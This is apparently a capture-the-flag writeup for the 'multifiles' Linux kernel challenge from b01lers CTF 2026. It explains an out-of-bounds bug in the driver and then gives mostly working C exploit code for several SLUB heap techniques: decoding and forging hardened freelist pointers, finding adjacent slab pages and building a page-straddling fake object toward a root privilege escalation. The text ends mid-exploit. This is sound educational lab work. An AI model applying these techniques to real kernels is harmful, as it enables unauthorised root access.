+++
title = "b01lers ctf 2026: kernel pwn (part 2)"
date = "2026-05-18"
description = "Writeup for kernel pwn challenge from b01lers ctf 2026."
tags = [
    "kernel",
    "pwn",
]
+++
# Intro
Previously I wrote a writeup on the first kernel challenge from this CTF — if you haven't read it yet, I recommend starting with [Part 1](https://icctx.xyz/blog/throughthewall/).

This post covers **multifiles**, the second kernel pwn challenge.

Since I'm releasing this writeup a bit late: in Part 1, to cover all the steps required for exploitation, I reimplemented the exploit from scratch in Rust. This time around, given the delay, you'll get a refactored version of the original exploit in C instead.

# multifiles
[download](https://raw.githubusercontent.com/icctx/ctf/refs/heads/main/b01lers.2026/multifiles/multifiles.tar.gz)
## Recon
```bash
.
├── build_out
│   ├── bzImage
│   ├── initrd.cpio.gz
│   ├── kernel.config
│   ├── multifiles.ko
│   └── System.map
├── deploy
│   ├── docker-compose.prod.yml
│   ├── docker-compose.yml
│   ├── Dockerfile
│   ├── Dockerfile_build
│   └── wrapper.sh
├── dev.sh
├── pwn_build.sh
├── README.md
└── src
    ├── drop_priv.c
    ├── initrd_init
    ├── kernel-cache-usercopy.diff
    ├── kernel.config.fragment
    ├── Makefile
    └── multifiles.c

4 directories, 19 files
```
README.md
```Markdown
# multifiles

build artifacts in `build_out/`

rebuild with `pwn_build.sh`

run challenge with `dev.sh`
```

Based on `deploy/wrapper.sh`, I assembled a local run script:
```sh
#!/bin/sh
qemu-system-x86_64 \
   -nodefaults -m 256M -nographic \
   -kernel ~/multifiles/build_out/bzImage \
   -initrd ~/multifiles/build_out/initrd.cpio.gz \
   -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr" \
   -cpu qemu64,+smep,+smap \
   -smp 1 -no-reboot -serial stdio -monitor none
```

The VM boots successfully.
```sh
[multifiles] booting challenge initrd
==============================
 multifiles kernel challenge
==============================
Device: /dev/multifiles
Flag:   /root/flag.txt (root only)
User:   ctf (uid=1000)
==============================


BusyBox v1.35.0 (Debian 1:1.35.0-4+b7) built-in shell (ash)
Enter 'help' for a list of built-in commands.

sh: can't access tty; job control turned off
~ $ 
```


## Read sources
```sh
src
├── drop_priv.c
├── initrd_init
├── kernel-cache-usercopy.diff
├── kernel.config.fragment
├── Makefile
└── multifiles.c
```

`drop_priv` and `initrd_init` follow the same pattern as Part 1.
Here we have a target kernel module and a small patch to the kernel itself.

Let's go through the interesting source files.

`kernel-cache-usercopy.diff` adds `kmem_cache_copy_from_user` / `kmem_cache_copy_to_user` — wrappers around `copy_from/to_user` that first verify the destination/source object belongs to a specific slab cache before performing the copy:
```diff
+/**
+ * kmem_cache_copy_from_user - Copy from userspace into an object from a cache
+ * @cachep: The cache the destination object must belong to.
+ * @to: Destination address in kernel memory.
+ * @from: Source address in userspace.
+ * @n: Number of bytes to copy.
+ *
+ * This wraps copy_from_user(), but first verifies that @to lives in a slab
+ * belonging to @cachep. The subsequent copy_from_user() call performs the
+ * normal hardened usercopy heap validation for the destination range.
+ *
+ * Return: number of bytes not copied, like copy_from_user().
+ */
```

From `kernel.config.fragment`, note the slab configuration:
```
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_SLAB_FREELIST_RANDOM=n
```
`FREELIST_HARDENED` encodes freelist pointers (`next ^ secret ^ bswap64(slot_addr)`), making them not trivially readable. `FREELIST_RANDOM=n` means the freelist order within a slab page is deterministic — useful for reliable object placement. If this is unfamiliar, [this article](https://samsung.github.io/kspp-study/heap-ovfl.html#protecting-the-integrity-of-heap-metadata) is a good reference.

`multifiles.c`: the `init` and `exit` functions are standard boilerplate. The interesting part is the `file_operations` table:
```c
static const struct file_operations multifiles_fops = {
    .owner = THIS_MODULE,
    .open = multifiles_open,
    .release = multifiles_release,
    .read = multifiles_read,
    .write = multifiles_write,
    .llseek = multifiles_llseek,
    .unlocked_ioctl = multifiles_ioctl,
    #ifdef CONFIG_COMPAT
    .compat_ioctl = multifiles_ioctl,
    #endif
};
```

Now the data structures the module operates on:
```c
#define TYPE_FILE 1

// this should be the only flags needed. should not be leaked to userspace
#define DEFAULT_FLAGS 0x7d333a7b66746362

#define NAME_SIZE 16
#define DATA_COUNT 16
#define MAX_RW_SIZE 64

typedef struct {
    u64 type;
    u64 flags;
    char name[NAME_SIZE];
    u64 data[DATA_COUNT];
} MultiFile;

#define NUM_SLOTS 67

typedef struct {
    struct mutex lock;
    MultiFile *files[NUM_SLOTS];
    u32 active_idx;
} MultiFileList;

typedef struct {
    char name[16];
} MultiFileCreateReq;
```

A few things to note from this:

- `MultiFile` is `0xa0` bytes (`0x10` header of `type`+`flags` + `0x10` `name` + `0x80` `data`). These are the objects allocated from `multifiles_cache`, one per `ioctl(CREATE)`.
- Each `open()` allocates one `MultiFileList` (stored in `file->private_data`), which holds up to `NUM_SLOTS = 67` `MultiFile` pointers in `files[]`. So a single fd can keep up to 67 live objects, and the index returned by `CREATE` is just the slot in this per-fd array. `active_idx` selects which slot `read`/`write` operate on.
- `DEFAULT_FLAGS = 0x7d333a7b66746362` is set on every freshly created `MultiFile`, and the source explicitly comments it *should not be leaked to userspace*. In ASCII that's `bctf{:3}` — a deliberate canary. Note **where** it lives: offset `0x08`, inside the `type`+`flags` header. As we'll see, the cache's usercopy region starts at `name` (`0x10`), so this header sits *outside* what `copy_to/from_user` is allowed to touch — which is exactly what stops us from leaking it directly.

## Vulnerabilities

Looking at `multifiles_read`:
```c
  150  static ssize_t multifiles_read(struct file *self, char __user *buf, size_t count, loff_t *offset) {
  151      MultiFileList *list = self->private_data;
  152      ssize_t ret = 0;
  153      if (list == NULL) {
  154          return -EINVAL;
  155      }
  156
  157      mutex_lock(&list->lock);
  158
  159      // check index is selected
  160      MultiFile *multi_file = get_active_file(list);
  161      if (multi_file == NULL) {
  162          ret = -ENOENT;
  163          goto out_unlock;
  164      }
  165
  166      // check read bounds
  167      if (
  168          count > MAX_RW_SIZE
  169          || (count % sizeof(u64)) != 0
  170          || *offset >= sizeof(MultiFile)
  171          || *offset < 0
  172      ) {
  173          ret = -EINVAL;
  174          goto out_unlock;
  175      }
  176
  177      loff_t old_offset = *offset;
  178      *offset += count;
  179
  180      if (kmem_cache_copy_to_user(
  181          multifiles_cache,
  182          buf,
  183          ((u8 *) &multi_file->data[0]) + old_offset,
  184          count
  185      ) != 0) {
  186          ret = -EFAULT;
  187          goto out_unlock;
  188      }
  189
  190      ret = count;
  191
  192  out_unlock:
  193      mutex_unlock(&list->lock);
  194      return ret;
  195  }
```
`multifiles_write` is similar.

The bounds check validates `offset` against `sizeof(MultiFile) = 0xa0`, but the actual copy base is `&multi_file->data[0] + offset = obj+0x20+offset`. So at `offset=0x80` the copy starts at `obj+0xa0` — exactly the first byte of the next adjacent slab object.

Now `multifiles_llseek`:
```c
  244  loff_t multifiles_llseek(struct file *self, loff_t offset, int whence) {
  245      MultiFileList *list = self->private_data;
  246      if (
  247          list == NULL
  248          // too lazy to support other types
  249          || whence != SEEK_SET
  250          || offset >= sizeof(MultiFile)
  251          || offset < 0
  252      ) {
  253          return -EINVAL;
  254      }
  255
  256      mutex_lock(&list->lock);
  257      self->f_pos = offset;
  258      mutex_unlock(&list->lock);
  259
  260      return offset;
  261  }
```

`llseek` lets us set `f_pos` (the file position) to any value in `[0, 0xa0)`. Combined with the mismatched copy base, this gives a controlled OOB window into the next adjacent slab object.

It's worth being precise about *why* `f_pos` is the same thing as the `loff_t *offset` that `multifiles_read`/`multifiles_write` receive. When userspace calls `read(fd, buf, n)`, the VFS path `ksys_read()` (in `fs/read_write.c`) does roughly:

```c
loff_t pos = file_pos_read(file);     // copy of file->f_pos
vfs_read(file, buf, n, &pos);         // -> file->f_op->read(file, buf, n, &pos)
file_pos_write(file, pos);            // write the (advanced) position back
```

So the `loff_t *offset` argument handed to the driver is a pointer to a copy of `file->f_pos`, and after the op the kernel writes it back (which is why a normal `read` advances the position). `multifiles_llseek` sets `file->f_pos` directly. Net effect: `lseek()` followed by `read()`/`write()` lets us pick exactly where the driver's copy starts — including the OOB window `[0x80, 0x9f]`.

> **Further reading — VFS `f_pos` / `llseek`:**
> - [Linux kernel docs — VFS, `struct file_operations`](https://www.kernel.org/doc/html/latest/filesystems/vfs.html) (the `llseek`/`read`/`write` contracts)
> - [`lseek(2)` man page](https://man7.org/linux/man-pages/man2/lseek.2.html) (userspace semantics, `SEEK_SET`)
> - [`fs/read_write.c` on Bootlin Elixir](https://elixir.bootlin.com/linux/latest/source/fs/read_write.c) — read `ksys_read`, `file_pos_read`/`file_pos_write`, `vfs_read`, `generic_file_llseek` to see how `f_pos` flows into `*offset`

## Primitives

**Controlled OOB read/write:**
By setting `f_pos` via `llseek` to a value in `[0x80, 0x9f]`, `read()`/`write()` will copy from/to `obj+0x20+offset`, which lands in the next adjacent slab object. Up to 64 bytes (`MAX_RW_SIZE`) per operation, 8-byte aligned (`count % sizeof(u64) == 0`).

**Arbitrary position within object:**
`llseek` allows resetting `f_pos` to any value in `[0, 0x9f]`, giving full control over where within the object (or OOB window) the next read/write lands.

**Multiple independent file descriptors:**
Each `open()` on `/dev/multifiles` gets its own `MultiFileList` with its own 67 slots and its own `f_pos`. Objects in one fd's list can be adjacent in the slab to objects from another fd's list, enabling cross-fd OOB access.


## Exploitation

Before diving in, here's the whole plan:

1. **Validate the OOB.** Confirm a slot can read its neighbor through the base-vs-bounds mismatch.
2. **Leak the heap.** Decode `page_base` and `cache_random` from encoded freelist words on a full slab page.
3. **Forge a freelist pointer.** With the secret known, poison a freed object's `next` to a chosen address.
4. **Find contiguous pages.** Locate two physically adjacent slab pages `A`, `B == A+0x1000`.
5. **Build a page-end fake object.** Poison `A`'s tail so a fresh object lands at `A+0xfc0` and straddles into `B`.
6. **Cross-cache reclaim.** Drain `B` back to the buddy allocator and let a `struct file` for `/bin/drop_priv` take its place.
7. **Patch and respawn.** Flip the file's `f_mode` write bits through the straddle, `pwrite` the binary, and let init rerun it as root.

### Primitive validation

The exploit is built on a thin layer of wrappers over the driver ABI:

```c
int  mf_open(void);                          // open("/dev/multifiles", O_RDWR)
int  mf_create(int fd, const char *name);    // ioctl(CREATE) -> slot index
void mf_set_active(int fd, uint32_t idx);    // ioctl(SET_ACTIVE)
void mf_delete(int fd, uint32_t idx);        // ioctl(DELETE)
// select idx, lseek(fpos, SEEK_SET), then read len bytes (len % 8 == 0, <= 64)
void mf_read(int fd, uint32_t idx, off_t fpos, void *buf, size_t len);
```

Note `mf_read` folds `set_active` + `lseek` + `read` into one call, so `fpos`
is exactly the `f_pos` the driver will use as its copy offset.

For now let's work within a single file descriptor and validate the OOB primitive.
```c
int main(void) {
    int fd = mf_open();
    int a0 = mf_create(fd, "a0");
    int a1 = mf_create(fd, "a1");
    int a2 = mf_create(fd, "a2");
    printf("[*] created slots: a0=%d a1=%d a2=%d\n", a0, a1, a2);

    printf("[*] press enter to set_active(%d)...\n", a0);
    getchar();

    mf_set_active(fd, a0);
    printf("[*] active = %d\n", a0);

    return 0;
}
```
`multifiles_set_active` is `static` and gets inlined into `multifiles_ioctl`, so there is no standalone symbol to break on. Set a breakpoint at `multifiles_ioctl` (`.text+0x2f0`) and step into the `SET_ACTIVE` branch from the switch.

```sh
gef> x/16gx $r12+0x20
0xffff8880038d7020:     0xffff888003989000      0xffff8880039890a0
0xffff8880038d7030:     0xffff888003989140      0x0000000000000000
0xffff8880038d7040:     0x0000000000000000      0x0000000000000000
0xffff8880038d7050:     0x0000000000000000      0x0000000000000000
0xffff8880038d7060:     0x0000000000000000      0x0000000000000000
0xffff8880038d7070:     0x0000000000000000      0x0000000000000000
0xffff8880038d7080:     0x0000000000000000      0x0000000000000000
0xffff8880038d7090:     0x0000000000000000      0x0000000000000000
gef> telescope *(void**)($r12+0x20) -n
      0xffff888003989000|+0x0000|+000: 0x0000000000000001
      0xffff888003989008|+0x0008|+001: 0x7d333a7b66746362 'bctf{:3}a0'
      0xffff888003989010|+0x0010|+002: 0x0000000000003061 ('a0'?)
      0xffff888003989018|+0x0018|+003: 0x0000000000000000
      0xffff888003989020|+0x0020|+004: 0x0000000000000000
      0xffff888003989028|+0x0028|+005: 0x0000000000000000
      0xffff888003989030|+0x0030|+006: 0x0000000000000000
      0xffff888003989038|+0x0038|+007: 0x0000000000000000
      0xffff888003989040|+0x0040|+008: 0x0000000000000000
      0xffff888003989048|+0x0048|+009: 0x0000000000000000
      0xffff888003989050|+0x0050|+010: 0x0000000000000000
      0xffff888003989058|+0x0058|+011: 0x0000000000000000
      0xffff888003989060|+0x0060|+012: 0x0000000000000000
      0xffff888003989068|+0x0068|+013: 0x0000000000000000
      0xffff888003989070|+0x0070|+014: 0x0000000000000000
      0xffff888003989078|+0x0078|+015: 0x0000000000000000
      0xffff888003989080|+0x0080|+016: 0x0000000000000000
      0xffff888003989088|+0x0088|+017: 0x0000000000000000
      0xffff888003989090|+0x0090|+018: 0x0000000000000000
      0xffff888003989098|+0x0098|+019: 0x0000000000000000
      0xffff8880039890a0|+0x00a0|+020: 0x0000000000000001
      0xffff8880039890a8|+0x00a8|+021: 0x7d333a7b66746362 'bctf{:3}a1'
      0xffff8880039890b0|+0x00b0|+022: 0x0000000000003161 ('a1'?)
      0xffff8880039890b8|+0x00b8|+023: 0x0000000000000000
      ...
      0xffff888003989140|+0x0140|+040: 0x0000000000000001
      0xffff888003989148|+0x0148|+041: 0x7d333a7b66746362 'bctf{:3}a2'
      0xffff888003989150|+0x0150|+042: 0x0000000000003261 ('a2'?)
      ...
```

### Leaking the flag — and the hardened usercopy wall

The obvious first target is that `bctf{:3}` canary in `flags`. A freshly created neighbor has `flags` at offset `0x08`, so let's point the OOB read at the neighbor's header: `f_pos=0x80` makes the copy start at `obj+0xa0` = the neighbor's offset `0`, which would put its `flags` in `leak[1]`.

```c
uint8_t leak[0x40];
mf_read(fd, a0, 0x80, leak, sizeof(leak)); // copy base obj+0xa0 = neighbor+0x00
// neighbor flags would land at leak+0x08
printf("[*] neighbor flags = 0x%llx\n", *(unsigned long long *)(leak + 8));
```

Running it instantly panics:

```sh
[   12.567074] usercopy: Kernel memory exposure attempt detected from SLUB object 'multifiles_cache' (offset 0, size 64)!
[   12.568138] ------------[ cut here ]------------
[   12.568300] kernel BUG at mm/usercopy.c:102!
[   12.569592] Oops: invalid opcode: 0000 [#1] PREEMPT SMP PTI
[   12.570619] CPU: 0 UID: 1000 PID: 54 Comm: w Tainted: G           O       6.12.81-dirty #1
[   12.571082] Tainted: [O]=OOT_MODULE
[   12.571198] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
[   12.571507] RIP: 0010:usercopy_abort+0x68/0x80
[   12.572341] Code: ac 51 48 c7 c2 48 b3 97 ac 41 52 48 c7 c7 58 2d 9c ac 48 0f 45 d6 48 c7 c6 45 09 96 ac 48 89 c1 49 0f 45 f3 e8 f9 27 e9 ff 90 <0f> 0b 49 c7 c1 f8 f4 99 ac 4d 89 ca 4d 89 c8 eb a7 0f 1f 80 00 00
[   12.572840] RSP: 0018:ffffb6d740173dd0 EFLAGS: 00010246
[   12.573072] RAX: 000000000000006a RBX: ffffa01ac19ba0a0 RCX: 00000000ffffdfff
[   12.573194] RDX: 0000000000000000 RSI: ffffb6d740173c88 RDI: 0000000000000001
[   12.573337] RBP: 0000000000000040 R08: 0000000000009ffb R09: 00000000ffffdfff
[   12.573559] R10: 00000000ffffdfff R11: ffffffffacc555e0 R12: 0000000000000001
[   12.573675] R13: ffffa01ac19ba0e0 R14: fffffffffffffff2 R15: ffffb6d740173f08
[   12.573815] FS:  0000000000409cb8(0000) GS:ffffa01acf800000(0000) knlGS:0000000000000000
[   12.573935] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   12.574026] CR2: 000000000040601a CR3: 00000000019a4000 CR4: 00000000003006f0
[   12.574242] Call Trace:
[   12.575178]  <TASK>
[   12.575606]  __check_heap_object+0x7d/0xa0
[   12.575858]  __check_object_size+0x166/0x2b0
[   12.575983]  kmem_cache_copy_to_user+0x85/0xe0
[   12.576196]  multifiles_read+0xa6/0xc0 [multifiles]
[   12.576675]  vfs_read+0xda/0x350
[   12.576795]  ksys_read+0x6a/0xf0
[   12.576868]  do_syscall_64+0x9e/0x1a0
[   12.577066]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   12.577338] RIP: 0033:0x4042b0
[   12.578697]  </TASK>
[   12.578775] Modules linked in: multifiles(O)
[   12.579623] ---[ end trace 0000000000000000 ]---
[   12.581620] Kernel panic - not syncing: Fatal exception
[   12.582376] Kernel Offset: 0x2aa00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
```

This is hardened usercopy. Recall the cache is created with `kmem_cache_create_usercopy(..., offsetof(MultiFile, name), USERCOPY_SIZE, ...)` — useroffset `0x10`, usersize `0x90`. Only `[obj+0x10, obj+0xa0)` (`name` + `data`) is allowed to cross the user boundary. `__check_object_size` figures out which slab object our source pointer lands in (the neighbor) and checks the range against *its* usercopy region. Our copy started at `neighbor+0x00`, below `0x10`, so it aborts — "offset 0, size 64".

The takeaway is a hard constraint on the primitive: the OOB copy must start at `neighbor+0x10` or later, i.e. **`f_pos >= 0x90`**. The header — `type`, `flags`, and (once the object is freed) the freelist pointer at offset `0` — is all unreachable this way. So the `bctf{:3}` canary cannot be leaked directly; it lives in the header precisely so hardened usercopy guards it.

Pointing the read at the neighbor's `name` instead works cleanly (`f_pos=0x90` → start `obj+0xb0` = `neighbor+0x10`):

```c
// usercopy region is [name(0x10), 0xa0); copy must start at >= neighbor+0x10
uint8_t leak[0x40];
mf_read(fd, a0, 0x90, leak, sizeof(leak)); // copy base obj+0xb0 = neighbor->name
printf("[*] neighbor name = 0x%llx ('%.16s')\n",
       *(unsigned long long *)leak, (char *)leak);
```

```sh
[*] neighbor name = 0x3161 ('a1')
```

`0x3161` is `"a1"` — the name we gave the second object — confirming slot 0 and slot 1 are adjacent and the OOB read works. The primitive is validated, with the constraint baked in: we can only see `[neighbor+0x10, neighbor+0xa0)` (`name` + `data`).

### Free the chunk

Let's free the neighbor (`mf_delete`) and look at what SLUB leaves behind.

Dumping the freed object (shown here in gdb at its real address; everything in `[0x10, 0xa0)` is also reachable through our OOB read):

```sh
0xffff8880039980a0 +0x00: 0x0000000000000001           type   (NOT cleared on free)
0xffff8880039980a8 +0x08: 0x7d333a7b66746362  bctf{:3}  flags  (NOT cleared)
0xffff8880039980b0 +0x10: 0x0000000000003161  "a1"      name   (NOT cleared)
0xffff8880039980b8 +0x18: 0x0000000000000000
0xffff8880039980c0 +0x20: 0x0000000000000000           data[0]
   ...
0xffff8880039980f0 +0x50: 0x76bb00d4c7d73040  <-- freelist pointer
0xffff8880039980f8 +0x58: 0x0000000000000000
   ...
0xffff888003998140 +0xa0: 0x0000000000000001           (next object's type)
```

Two things stand out.

First, **SLUB does not zero an object on free** — it only writes the freelist pointer. That's why `type`, `flags` (`bctf{:3}`) and `name` ("a1") survive untouched in the freed chunk.

Second, the freelist pointer sits at **offset `0x50`**, not `0`. That's `sizeof(MultiFile) / 2`, the result of the "relocate freelist pointer to the middle of the object" hardening. Crucially `0x50` falls inside `[0x10, 0xa0)` — the usercopy region — so unlike the `0x00` header, **we can both read and write the freelist pointer through the OOB primitive.**

Why does the value (`0x76bb00d4c7d73040`) look like garbage? `CONFIG_SLAB_FREELIST_HARDENED` mangles it:

```
fp = next ^ s->random ^ bswap64(&slot)
```

where `&slot` is the address of the pointer itself (`obj+0x50`), `next` is the next free object in the list, and `s->random` is a per-cache secret. A single read is one equation with three unknowns — we can't naively decode it, nor forge an arbitrary pointer to write back.

### Reading it through the OOB primitive

The dump above is gdb at the object's real address; in the exploit we only have `read()`. To pull `neighbor+0x50` into a 64-byte copy window the copy has to start at or before it: `f_pos=0x98` sets the base to `obj+0xb8 = neighbor+0x18`, and a `0x40`-byte read spans `neighbor[0x18, 0x58)`, so the encoded word at `neighbor+0x50` lands at `leak+0x38`.

We also need the neighbor to actually be *free* — otherwise `+0x50` is just zeroed `data` — and we want its `next` to be a value we can reason about. So allocate three adjacent objects and free the last two. SLUB's per-cpu freelist is LIFO, so freeing `b2` then `b1` leaves `b1->next == b2`:

```c
int b0 = mf_create(fd, "b0");
int b1 = mf_create(fd, "b1");
int b2 = mf_create(fd, "b2");

mf_delete(fd, b2);   // free b2 first
mf_delete(fd, b1);   // then b1  ->  b1->next == b2, freeptr written at b1+0x50

uint8_t leak[0x40];
mf_read(fd, b0, 0x98, leak, sizeof(leak));   // window b1[0x18, 0x58)

uint64_t enc;
memcpy(&enc, leak + 0x38, sizeof(enc));      // b1+0x50
printf("[+] encoded freelist ptr @ b1+0x50 = 0x%016llx\n",
       (unsigned long long)enc);
```

```sh
[+] encoded freelist ptr @ b1+0x50 = 0x4b89a339485018db
```

That `0x4b89a339485018db` is `b2 ^ s->random ^ bswap64(b1+0x50)` — kernel-controlled metadata, not the `name` bytes we picked. Reading (and writing) `+0x50` is now a real code primitive, not just a gdb observation.

### What the membership check rules out

Before building on the freelist pointer, look at the custom gate every copy goes through (`kernel-cache-usercopy.diff`):

```c
static bool kmem_cache_has_object(struct kmem_cache *cachep, const void *ptr) {
	struct slab *slab = virt_to_slab(ptr);
	return slab && slab->slab_cache == cachep;
}
```

This is a **per-slab-folio** check: it resolves the page `ptr` lives in and requires `slab->slab_cache == multifiles_cache`. The consequence for a cross-cache plan: if we drain a multifiles slab page back to the buddy allocator and let another cache (say `filp_cachep`) reclaim it, that page's `slab_cache` is no longer `multifiles_cache`, so any OOB read/write through `multifiles_read`/`write` fails the check. **We cannot OOB-read a reclaimed `struct file` directly** — the naive "cross-cache then read the foreign object" approach is dead on arrival.

So the workable primitive is the freelist pointer we can read and write at `+0x50`. The remaining problem is weaponizing it under the hardening: either leak `s->random` + a heap address, or use a poisoning trick that cancels both (page-relative deltas XOR out the page base and the secret). That's the next step.

### Decoding the freelist pointer

#### Primary source

The encoding lives in `freelist_ptr_encode()` in [`mm/slub.c` (v6.12)](https://elixir.bootlin.com/linux/v6.12/source/mm/slub.c):

```c
static inline freeptr_t freelist_ptr_encode(const struct kmem_cache *s,
                    void *ptr, unsigned long ptr_addr)
{
    unsigned long encoded;
#ifdef CONFIG_SLAB_FREELIST_HARDENED
    encoded = (unsigned long)ptr ^ s->random ^ swab(ptr_addr);
#else
    encoded = (unsigned long)ptr;
#endif
    return (freeptr_t){.v = encoded};
}
```

and `set_freepointer()` fixes `ptr_addr` to the storage slot itself:

```c
unsigned long freeptr_addr = (unsigned long)object + s->offset;
*(freeptr_t *)freeptr_addr = freelist_ptr_encode(s, fp, freeptr_addr);
```

`s->offset` is `0x50` for our cache, `swab` on a 64-bit value is `bswap64`, so for an object at base `O`:

```sh
E(O) = next(O) ^ s->random ^ bswap64(O + 0x50)
```

One word is one equation in three unknowns — `next`, `s->random`, and `O` (which hides the unknown page base). We kill two of them with two XOR cancellations.

#### Two cancellations

1. **XOR two words to cancel `random`.** It's one per-cache constant, so `E(A) ^ E(B)` drops it.
2. **Same-page bswap cancels the page base.** `bswap64(a) ^ bswap64(b) = bswap64(a ^ b)`, and for two freeptr slots on the same 4K page `a ^ b` is just the low-bits *delta* — the page base is identical in both and cancels. We don't know the address, but we know the *"distance"*.

#### Layout

`0x1000 / 0xa0 = 25` objects per page (`0x60` tail padding). On a pristine page allocations climb by address, so `O_i = page + i*0xa0`. We use three of them:

```
O_20 = page+0xc80   slot page+0xcd0
O_22 = page+0xdc0   slot page+0xe10
O_24 = page+0xf00   slot page+0xf50   (last object on the page)
```

To read `E(O_i)` we OOB-read from its *live* left neighbor `O_{i-1}` (`f_pos=0x98`, word at `leak+0x38`), so we keep odd indices alive and free even ones. Fill the page completely, then free `24, 22, 20` in that order — the per-cpu freelist is LIFO and a full page starts with an empty freelist, so:

```
free 24:  next(O_24) = NULL
free 22:  next(O_22) = O_24
free 20:  next(O_20) = O_22
```

#### Recovering page base and random

`slot24 ^ slot22 = 0xf50 ^ 0xe10 = 0x140`, and `bswap64(0x140) = 0x4001000000000000`. With `e24/e22/e20` read from `O_23/O_21/O_19`:

```c
// e24 = NULL ^ R ^ bsw(page+0xf50)
// e22 = O_24 ^ R ^ bsw(page+0xe10)   (O_24 = page+0xf00)
uint64_t O24    = e22 ^ e24 ^ 0x4001000000000000ULL; // R and page base both cancel
uint64_t page   = O24 - 0xf00;
uint64_t random = e24 ^ bsw(page + 0xf50);           // e24 = R ^ bsw(slot24)

// cross-check: decode O_20 -> next must be O_22
if ((e20 ^ random ^ bsw(page + 0xcd0)) != page + 0xdc0)
    die("decode cross-check failed");
```

Running it:

```sh
[~] decode
[+] page_base    = 0xffffa30441994000
[+] cache_random = 0x0f2dff77be715bcc
```

`page_base` is `0x1000`-aligned and lands in the direct map — but note it is **not** the textbook `0xffff8880...`; this kernel has direct-map KASLR, which is exactly why we never hardcode a base and validate with the cross-check (`next(O_20) == O_22`) instead. With `s->random` in hand the encoding is fully invertible: we can decode any freelist word, and — more usefully — `forge` one as `target ^ random ^ bswap64(&slot)`.

> **Practical note.** The 25-object fill must land on a pristine page for `O_i = page + i*0xa0` to hold, so in the exploit `decode` runs first on a dedicated fd, before any other `CREATE`, and refills the three freed slots afterwards so the later stages start on a clean page.

### Poisoning the freelist

With `s->random` and a heap base we can run the encoding *backwards*: to make slot `S` hold an encoded pointer to `target`, write `target ^ random ^ bswap64(S)`. The plan is to overwrite a *freed* object's `+0x50` so the freelist leads to an address we picked — then two `CREATE`s hand it back as a fresh `MultiFile`.

**Target.** `page + 0xfc0`. A `0xa0` object placed there spans `[page+0xfc0, page+0x1060)` — the last `0x40` bytes of this page plus the first `0x60` of the *next physical page*. `0xfc0` sits in the page's tail padding, and the object's start is still on a multifiles page, so the membership check and hardened usercopy both stay happy. That straddle is what later becomes a cross-page primitive.

**Where we poison.** The freed object `F` has to be the current cpu-slab freelist head *and* at a known address. `page0` from the leak fits both: right after `decode` it is full and still the cpu slab, and `F = page + 12*0xa0` (slot `0x7d0`) has a known address. Freeing it pushes it to the cpu freelist with `F->next == NULL`.

**Writing `+0x50`.** Same window as the read, other direction: from the live left neighbor `F-1` at `f_pos=0x98` the copy lands on `F[0x18, 0x58)`, so we read it, splice the forged word in at `leak+0x38`, and write it back.

```c
uint32_t F      = 12;                     // F = page + 12*0xa0
uint64_t F_slot = page + 12*0xa0 + 0x50;  // page+0x7d0
uint64_t target = page + 0xfc0;

mf_delete(fd, F);                         // F -> cpu freelist head, F->next == NULL

uint64_t enc = target ^ random ^ bsw(F_slot);   // forge
mf_read (fd, F - 1, 0x98, leak, sizeof(leak));
memcpy(leak + 0x38, &enc, 8);
mf_write(fd, F - 1, 0x98, leak, sizeof(leak));

// read it back and decode -> must equal target
mf_read(fd, F - 1, 0x98, leak, sizeof(leak));
memcpy(&enc, leak + 0x38, 8);
uint64_t decoded = enc ^ random ^ bsw(F_slot);
```

```sh
[~] poison
[+] F+0x50 decodes to 0xffff896f419bafc0 (target 0xffff896f419bafc0)
```

The freelist now reads `F -> page+0xfc0`: the next `CREATE` pops `F`, and the one after pops `page+0xfc0`. We stop one step short of actually allocating it — popping `page+0xfc0` sets the cpu freelist head to whatever garbage sits at `*(page+0x1010)`, so doing it is a one-way door. Instead we re-encode `NULL` back into `F+0x50` and consume `F`, leaving `page0` full and the cache clean. The next step is to make sure that straddle reaches a page we actually own.

### Finding contiguous pages

Allocating the fake object isn't free: `CREATE` uses `kmem_cache_zalloc`, which zeroes `0xa0` bytes from `page+0xfc0` — and `0x60` of those land in the *next physical page*. We then read and write that straddle window. So the page at `page+0x1000` can't be arbitrary kernel memory; it has to be a slab page we own, or we corrupt something random and (best case) panic. So before allocating anything at a page tail we first locate a pair of **physically adjacent** multifiles pages `A, B` with `B == A + 0x1000`.

`cache_random` makes this cheap. The base of any *full* page falls out of a single NULL-terminated freeptr: free the page's last object (`pos24`, at `base+0xf00`) and its `next` becomes `NULL`, so the encoded word is just `random ^ bswap64(base+0xf50)`. Read it through the live `pos23` and invert:

```c
// free pos24 -> next == NULL; read its freeptr via the live pos23
mf_delete(fds[last/PERFD], last%PERFD);
mf_read (fds[prev/PERFD], prev%PERFD, 0x98, leak, sizeof(leak));
memcpy(&enc, leak + 0x38, 8);
uint64_t base = bsw(enc ^ random) - 0xf50;   // pos24+0x50 = bsw(enc^random)
```

Right after `decode`/`poison` the cache holds nothing but the full `page0`, so a plain sequential spray lays down fresh pages `page1, page2, …` in allocation order — object `gi` sits at `scan_page(gi/25) + (gi%25)*0xa0`. We spray `SCAN_PAGES` of them, decode every base, and look for `B == A + 0x1000`:

```sh
[~] root
[+] A=0xffff9de3419c2000  B=0xffff9de3419c3000
```

The buddy allocator hands out order-0 pages from contiguous runs often enough that a few dozen are almost always enough to contain an adjacent pair. `A` is the page whose tail object we'll poison; `B` is the page the fake object reaches into.

### Allocating the fake object

There's a snag: `A` is *not* the cpu slab. The buddy allocator handed pages out in ascending order, so by the time `B` exists `A` is already a deactivated full slab, and a plain `CREATE` won't touch it. SLUB's per-cpu partial list fixes that: freeing `A`'s tail object turns `A` partial, and once the current cpu slab runs dry the allocator pulls `A` back and starts handing out its objects again. So we free `pos24`, forge its `next` to `A+0xfc0`, and `CREATE` twice — the first pops `pos24`, the second pops `A+0xfc0`:

```c
mf_delete(fds[last/PERFD], last%PERFD);                 // free A's tail
uint64_t enc = (A + 0xfc0) ^ random ^ bsw(A + 0xf50);   // forge pos24->next
mf_read (fds[prev/PERFD], prev%PERFD, 0x98, leak, sizeof(leak));
memcpy(leak + 0x38, &enc, 8);
mf_write(fds[prev/PERFD], prev%PERFD, 0x98, leak, sizeof(leak));

mf_create(fds[last/PERFD], "reB");        // pops pos24
